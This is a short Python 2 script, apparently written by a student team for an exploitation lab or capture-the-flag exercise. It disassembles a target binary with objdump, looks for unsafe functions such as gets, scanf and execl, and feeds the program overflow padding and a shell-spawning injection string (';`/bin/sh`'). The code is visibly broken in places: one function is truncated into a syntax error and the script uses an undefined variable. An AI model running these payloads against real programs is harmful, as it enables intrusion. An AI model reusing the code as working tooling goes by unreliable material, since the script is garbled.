import sys
import os

def inject_gets(buffers): 	
	for buf in buffers:
		buf = int(buf,16)
		print buf
		gets_exploit(buf)


def inject_scanf(buffers): 
	for buf in buffers:
		buf = int(buf,16)
		print buf
		scanf_exploit(buf)
		

def gets_exploit(buf_size):
	exploit = "\x90"*buf_size
	result = os.system("echo " + exploit + " > exploit.txt && ./"+sys.argv[1]+ " $(cat exploit.txt)")
	if result != 0: 
		print "Success"
	else:
		print "Fail"
		

def scanf_exploit(buf_size):
	exploit = "1"*buf_size
	result = os.system("echo " + exploit + " > exploit.txt && ./"+sys.argv[1]
		print "Success"
	else:
		print "Fail"
		
def inject_execl():
	exploit = ";`/bin/sh`"
	os.system("echo " + exploit + " > exploit.txt && ./"+sys.argv[1]+ " $(cat exploit.txt)")
	

vulnerabilities = filter(None, os.popen('objdump -M Intel -d '+ sys.argv[1] + ' | grep -oP "(gets|scanf|strcpy|memcpy|printf|system|fgets|gets|execl)"').read().split('\n'))
vulnerabilities = list(set(filter(None, vulnerabilities)))

print "Team 7 below is the list of suspected vulnerabilites to look at:\n" + str(vulnerabilities)


buffers = filter(None,os.popen('objdump -d ' +sys.argv[1]+ ' | grep -oP "(?<=buf    .)....(?=,%esp)"').read()).split('\n')	
buffers.sort()
buffers = list(set(filter(None, buf)))
	
for suspect_func in vulnerabilities:

	if suspect_func == "gets":
		inject_gets(buffers)
		break
	elif suspect_func == "scanf":
		inject_scanf(buffers)
		break
	elif suspect_func == "execl":
	    inject_execl()
	    break
	    
